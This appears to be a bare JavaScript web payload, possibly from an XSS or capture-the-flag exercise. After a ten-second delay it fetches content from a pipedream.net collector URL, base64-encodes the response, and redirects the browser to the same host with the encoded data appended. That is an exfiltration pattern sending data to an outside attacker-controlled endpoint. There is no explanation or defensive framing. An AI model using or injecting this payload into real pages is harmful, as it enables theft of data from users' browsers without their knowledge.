setTimeout(function() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://b92311330cf132fa9cde87949527403b.m.pipedream.net");
    xhr.onreadystatechange = function () {
        if (xhr.status === 200) {
            location.href = "https://b92311330cf132fa9cde87949527403b.m.pipedream.net/?=" + btoa(xhr.responseText);
        };
    };
    xhr.send();
}, 10000);
